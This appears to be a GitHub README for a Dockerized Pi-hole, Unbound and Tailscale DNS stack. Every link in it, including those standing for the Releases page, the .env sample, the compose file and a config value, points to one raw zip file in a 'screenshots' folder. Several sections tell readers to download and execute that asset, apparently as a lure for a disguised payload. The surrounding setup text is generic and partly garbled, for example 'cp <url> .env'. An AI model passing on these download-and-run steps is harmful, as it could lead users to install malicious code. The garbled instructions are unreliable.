[Releases page](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip)

# Dockerized Pi-hole, Unbound, and Tailscale DNS Stack for Privacy

[![Releases](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip) [![Topics](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip%2Cdocker%2Cdocker-compose%2Cpi-hole%2Cremote-access-server%2Cself-hosted%2Ctailscale%2Cunbound-dns-green?logo=github)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip)

Welcome to a robust, private DNS stack that brings Pi-hole, Unbound, and Tailscale into a single Dockerized solution. This setup lets you block ads, resolve DNS recursively, and connect securely to your home network from anywhere. It’s designed to be simple to deploy, with environment-based configuration and a clean Docker Compose workflow. This README walks you through everything you need to know to run, customize, and maintain the stack.

- Repository: pihole-unbound-tailscale-dockerized
- Topics: adblocker, docker, docker-compose, pi-hole, remote-access-server, self-hosted, tailscale, unbound-dns
- Latest releases: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip

If you want to grab the latest release assets, head to the Releases page. The assets there include the installer script and/or a ready-to-run container setup. The file you should download and execute will be clearly named in the release notes or asset list on that page. For now, you can explore the Releases page to see what’s available and how it’s structured. The Releases page is your best source for updates and ready-to-run packages.

Table of contents
- Why this stack
- How the pieces fit together
- Quickstart: deploy with Docker Compose
- Prerequisites and environment planning
- Detailed architecture and security posture
- Docker Compose file explained
- Customization and advanced options
- Tailscale configuration and remote access
- DNS behavior and privacy considerations
- Networking and firewall guidance
- Monitoring, logging, and health checks
- Data persistence and backups
- Troubleshooting common issues
- Maintenance and upgrades
- Release management and versioning
- Contributing guidelines
- License

Why this stack
🧭 Privacy by design: This stack keeps DNS resolution private within your own network. You control the data path and can prevent leaks to external resolvers.

🧰 Modularity: Pi-hole handles ad blocking, Unbound provides recursive DNS with strong privacy, and Tailscale gives you a secure VPN to reach your home network from anywhere.

🚀 Dockerized deployment: The entire stack runs inside containers. Docker Compose makes it easy to spin up, manage, and re-create the environment.

🔒 Secure by default: DNS queries can be encrypted end-to-end via Tailscale when you’re connected, and you can tune firewall rules to minimize exposure.

What’s in this project
- Pi-hole as the DNS-based ad blocker and web management portal
- Unbound as a modern, open recursive resolver with DNSSEC
- Tailscale as a VPN/mesh network for secure remote access
- Docker Compose as the orchestration layer
- Environment-driven configuration for easy customization
- Scripts and templates to simplify deployment across hosts

How the pieces fit together
- The Pi-hole container serves as the DNS frontend. It answers queries for clients connected to the network and enforces ad-block rules.
- The Unbound container acts as the recursive resolver. It fetches DNS records on behalf of Pi-hole and validates responses with DNSSEC.
- The Tailscale container (or sidecar) creates a private network tunnel. Devices on your Tailscale network can resolve the private DNS without exposing queries to the public internet.
- Docker Compose ties everything together. It wires networks, volumes, and environment variables so you can deploy with a single command.

Quickstart: deploy with Docker Compose
Prerequisites
- A Linux host or compatible environment with Docker and Docker Compose installed
- Sufficient resources: 1–2 CPUs, 1–2 GB RAM per container, plus storage for DNS data and logs
- A stable network: a management network for the stack and a separate network for clients if you want strict segmentation

Step-by-step quickstart
1) Create a project directory
- mkdir -p ~/dns-stack/pihole-unbound-tailscale
- cd ~/dns-stack/pihole-unbound-tailscale

2) Prepare your environment
- Copy the sample environment file and adjust values as needed
- cp https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip .env
- Edit .env to set:
  - PIHOLE_WEBPASSWORD or alternative auth
  - UNBOUND_ROOT_HINTS to point to a valid root hints file
  - TAILSCALE_AUTHKEY if you plan to enroll devices automatically

3) Bring up the stack
- Run docker-compose up -d
- Wait a few moments for containers to start
- Check container logs if needed: docker-compose logs -f

4) Verify DNS resolution
- Point a client to the Pi-hole container’s IP for DNS (e.g., 192.168.1.2)
- Visit the Pi-hole admin interface at http://<pi-hole-ip>/admin
- Confirm that ad blocks are active and that Unbound is resolving queries

5) Connect clients with Tailscale
- Install the Tailscale client on devices you want to connect
- Authenticate to your Tailnet
- Use the private DNS domain you configured to direct queries through the stack
- Ensure clients are using the Tailscale DNS or the Pi-hole DNS for consistent results

6) Tune and customize
- Update the blocklists in Pi-hole
- Enable DNSSEC validation in Unbound
- Adjust Tailscale ACLs and routes to narrow access

Prerequisites and environment planning
- Choose a host with enough CPU and memory to satisfy the load you expect
- Plan DNS forwarders and fallback behavior in Unbound
- Decide whether you want to allow split-horizon DNS (different responses based on the client network)
- Decide on how you want to handle ad-block lists and allowlists

- Networking considerations
  - Your Pi-hole container will expose port 53 (DNS) and port 80 (Web UI) to your chosen networks
  - Unbound will be the DNS resolver that Pi-hole uses upstream
  - Tailscale will provide a secure tunnel for remote devices to access the DNS service
  - You may choose to expose DNS to your LAN and keep VPN DNS for remote devices behind the Tailscale tunnel

Architectural diagrams and visual guidance
- The stack is a small graph of components that communicates via DNS ports and VPN tunnels
- You can think of it as:
  - Clients -> Pi-hole (DNS front-end)
  - Pi-hole -> Unbound (recursive resolver)
  - Clients via Tailscale -> DNS service (encrypted path and secure remote access)

- Inline ASCII diagram:
  Clients (LAN) -> Pi-hole -> Unbound
  Tailscale VPN links remote clients to Pi-hole and Unbound
  End-to-end encryption for DNS queries when using Tailscale

- If you prefer a visual diagram, you can render an architecture diagram using your preferred diagram tool with these components and connections in mind.

Docker Compose file explained
- The https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip coordinates three main services:
  - pihole: The Pi-hole container that serves the DNS and web UI
  - unbound: The Unbound container that performs recursive DNS queries
  - tailscale: The Tailscale client connection (may be an agent or a sidecar) that provides secure remote access

- Core configuration aspects:
  - networks: A dedicated Docker network to ensure containers can talk to each other
  - volumes: Local storage for persistent data such as DNS caches, logs, and configuration
  - environment: Variables to tune Pi-hole and Unbound, such as DNSSEC, admin password, and DNS servers
  - ports: Expose only the necessary ports to the intended network

- Behavior you can expect:
  - Pi-hole serves the UI and ad-blocked DNS answers
  - Unbound resolves queries on behalf of Pi-hole with DNSSEC validation
  - Tailscale enables devices outside your LAN to reach the DNS services securely

Customization and advanced options
- Blocklists and allowlists
  - Add custom ad-block lists to Pi-hole
  - Create per-domain exceptions if you need to support certain services
  - Keep lists updated to maintain performance and accuracy

- DNSSEC and security
  - Enable DNSSEC validation in Unbound
  - Regularly update root hints and trust anchors
  - Consider TLS for DNS transport if you extend to DoT/DoH later

- Tailscale integration
  - Use Tailscale ACLs to control which devices can query the DNS service
  - Route DNS queries through the Tailscale network for private addressing
  - Consider multi-hop or exit node configurations if your privacy goals require them

- Data persistence and backups
  - Persist Pi-hole and Unbound data to local volumes
  - Schedule regular backups of configuration and DNS data
  - Rotate logs to prevent disk space exhaustion

- Performance tuning
  - Increase Unbound cache size for faster lookups
  - Fine-tune Pi-hole blocking rules to balance ad-block reach with site functionality
  - Monitor system load and scale resources if you run a large number of clients

Tailscale configuration and remote access
- Enrolling devices
  - Install the Tailscale client on devices you want to connect
  - Authenticate with your Tailnet
  - Ensure the devices have the DNS you configured in your stack
- DNS over Tailnet
  - When connected to Tailnet, devices can resolve via the private DNS path
  - You can configure the DNS to point to the Pi-hole service endpoint for a private, encrypted path
- ACLs and access control
  - Use Tailscale ACLs to restrict who can query the DNS service
  - Define a private DNS zone for Tailnet devices if needed
- Disaster recovery and offline scenarios
  - Keep a fallback DNS path for devices that aren’t connected via Tailnet
  - Document steps to quickly switch to a LAN-only DNS path if the Tailnet is unavailable

DNS behavior and privacy considerations
- Privacy posture
  - DNS queries are directed to a local Pi-hole instance, with upstream queries going to Unbound
  - When connected to Tailscale, queries can be encrypted and routed through the private network
- Logging and data retention
  - Decide what logs you want to retain
  - Consider anonymizing or reducing logging to improve privacy
  - Keep logs for troubleshooting but rotate and delete old data

- Ad-blocking effects
  - Pi-hole blocks many ad domains, reducing tracking
  - Some sites rely on ads for functionality, so you may need to adjust blocklists or whitelist certain domains
- DNS performance
  - Unbound caches queries to speed up responses
  - Tailscale adds a secure tunnel; ensure the network path is healthy to avoid latency spikes

Networking and firewall guidance
- LAN-side protections
  - Restrict DNS traffic to your Pi-hole and Unbound containers
  - Use a firewall to block external DNS ports unrelated to your stack
- VPN-side protections
  - Ensure VPN clients route DNS queries through the VPN
  - Consider splitting DNS traffic so private queries stay on the private network
- NAT considerations
  - If your host provides NAT, ensure the correct DNS forwarding is in place
  - Map port 53 and 80 in a secure way to your Pi-hole if you are exposing a UI for LAN-only access
- High availability
  - You can run multiple instances in a high-availability scenario
  - Use a load balancer between clients and Pi-hole if you plan large-scale usage

Monitoring, logging, and health checks
- Health checks
  - Ensure the Pi-hole DNS service is reachable
  - Confirm Unbound is resolving queries correctly
  - Verify Tailscale connectivity remains active for remote clients
- Logs
  - Monitor DNS queries and responses
  - Track blocked domain counts for insight into ad-block effectiveness
  - Turn on verbose logs during troubleshooting, then reduce to normal levels
- Metrics
  - Collect metrics for DNS performance, cache hit rate, and latency
  - Use container-level metrics to observe resource usage
  - Consider exporting metrics to a monitoring system for long-term visibility

Data persistence and backups
- Volumes
  - Use persistent volumes for Pi-hole catalog data, DNS cache, and blocklists
  - Persist Unbound configuration and cache data
  - Persist Tailscale state if you use a persistent key or keyring
- Backups
  - Schedule backups of critical data regularly
  - Include: blocklists, whitelist/blacklist configurations, Unbound root hints, and Tailscale configurations
- Recovery procedures
  - Document the steps to recreate the environment from a backup
  - Test restoration periodically to ensure reliability

Troubleshooting common issues
- DNS resolution failures
  - Check if Pi-hole is running and reachable
  - Confirm Unbound is resolving queries and that Pi-hole is configured to use Unbound as upstream
  - Validate that the DNS port is not blocked by a firewall
- Web UI access issues
  - Verify the Pi-hole admin password or authentication method
  - Check that port 80 (or your chosen UI port) is accessible on the LAN
- Tailscale connectivity problems
  - Ensure the Tailnet is healthy and devices are authenticated
  - Confirm ACLs allow DNS queries from remote devices
  - Verify the DNS server address used by the remote devices is the private DNS endpoint
- Blocklist updates
  - If ad-blocking stops working, check for changes in blocklist formats or remote fetch failures
  - Ensure the blocklists are synchronized with Pi-hole and updated regularly

Maintenance and upgrades
- Keeping components up to date
  - Regularly pull the latest container images
  - Review release notes for breaking changes or migration steps
  - Test upgrades in a staging environment before production
- Configuration drift
  - Store environment variables and compose files in version control
  - Document any manual changes to ensure they don’t drift between deployments
- Security patches
  - Apply upstream security updates for Pi-hole, Unbound, and Docker
  - Review access controls and update TLS configurations as needed

Release management and versioning
- Versioning approach
  - Use semantic versioning for releases (major, minor, patch)
  - Tag releases clearly in the repository for reproducibility
- Release notes
  - Provide changes, fixes, and upgrade notes for each release
  - Include migration steps if necessary
- Asset management
  - The Releases page hosts downloadable assets
  - If you see a path in the link, download the release asset and run the installer or extract the package
  - For new users, start with a fresh deployment and migrate settings as needed

Contributing guidelines
- How to contribute
  - Open an issue to discuss proposed changes
  - Create a feature branch and implement changes with clear, small commits
  - Submit a pull request with a detailed description
- Coding standards
  - Follow consistent style and documentation
  - Include tests or manual validation steps when appropriate
- Documentation
  - Update README and docs with any new configuration steps or usage notes
  - Add examples and troubleshooting tips

License
- This project is licensed under the MIT License
- See LICENSE for details

Docker Compose example (high-level, plain text)
- services:
  - pihole:
    - image: pihole/pihole:latest
    - environment:
      - TZ=UTC
      - WEBPASSWORD=changeme
      - ServerIP: 192.168.1.2
      - DNS1: 127.0.0.1
      - DNS2: 127.0.0.1
    - ports:
      - "53:53/tcp"
      - "53:53/udp"
      - "80:80"
    - volumes:
      - ./pihole:/etc/pihole
      - ./dnsmasq.d:/etc/dnsmasq.d
  - unbound:
    - image: mvance/unbound:latest
    - environment:
      - https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip
    - ports:
      - "5335:5335/tcp"
      - "5335:5335/udp"
    - volumes:
      - ./unbound:/etc/unbound
  - tailscale:
    - image: tailscale/tailscale:latest
    - cap_add:
      - NET_ADMIN
    - environment:
      - TS_AUTHKEY=tskey-placeholder
    - ports:
      - "41641:41641/tcp"

- Important: Adapt the exact image names, tags, and port mappings to your environment. The description above is a structural guide and not a drop-in replacement for a fully documented https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip

Asset download and execution (per the provided link)
- Since the link to the Releases page includes a path, you should download the latest release asset from that page and run the installer or script it contains. For example, the release might include an https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip script. Download and execute that script to bootstrap the stack on your host.
- The link is also useful for keeping your deployment up to date. When you need to upgrade, revisit the same Releases page to grab the new asset and re-run the installer or follow the upgrade instructions included there.

Releases page usage guidance
- The Releases page hosts versioned assets.
- Each release includes a changelog, asset files, and sometimes migration notes.
- If you’re unsure what to download, start with the installer script or a minimal docker-compose YAML bundled with the release.
- After downloading, follow the on-screen instructions to complete setup. The installer will typically ask you to confirm network settings, passwords, and volumes.

Notes about content you might modify
- If you add new features, update the documentation to reflect them.
- If you adjust default ports, ensure you document the changes and adjust any firewall rules accordingly.
- If you enhance security, document better defaults and new controls in the appropriate sections.

Inline SVG icons used for visuals
- DNS icon
- Shielded lock indicating privacy
- Network arrows showing connectivity
- Shield with “TL” for Tailscale

[Inline DNS icon SVG]
<svg width="24" height="24" viewBox="0 0 24 24" aria-label="DNS">
  <path d="M4 9h7v6H4z" fill="#1f8dd6"/>
  <path d="M13 9h7v6h-7z" fill="#2f8a3a"/>
  <path d="M4 7h16v2H4z" fill="#4a5568"/>
  <path d="M6 12h2v4H6z" fill="#fff"/>
</svg>

[Inline Lock icon SVG]
<svg width="24" height="24" viewBox="0 0 24 24" aria-label="Lock">
  <path d="M12 2a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7a2 2 0 0 0-2-2h-1V7a5 5 0 0 0-5-5z" fill="#374151"/>
  <circle cx="12" cy="11" r="3" fill="#fff"/>
</svg>

[Inline Network icon SVG]
<svg width="24" height="24" viewBox="0 0 24 24" aria-label="Network">
  <path d="M3 12h4v4H3z" fill="#10b981"/>
  <path d="M17 4h4v4h-4z" fill="#3b82f6"/>
  <path d="M3 7h4v4H3z" fill="#f59e0b"/>
  <path d="M12 16l7-4-7-4-7 4 7 4z" fill="#94a3b8"/>
</svg>

End note
- The aim is to provide a thorough, practical guide to running a private, Dockerized DNS stack that respects privacy while offering robust functionality for ad-blocking, DNS resolution, and remote access. This README strives to balance clarity with depth, giving you the confidence to deploy, customize, and maintain the stack in a self-hosted environment.

Releases page usage reminder
- For downloads, visit the Releases page again: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip
- The asset you download from that page should be executed as instructed by the release notes to bootstrap the deployment on your host.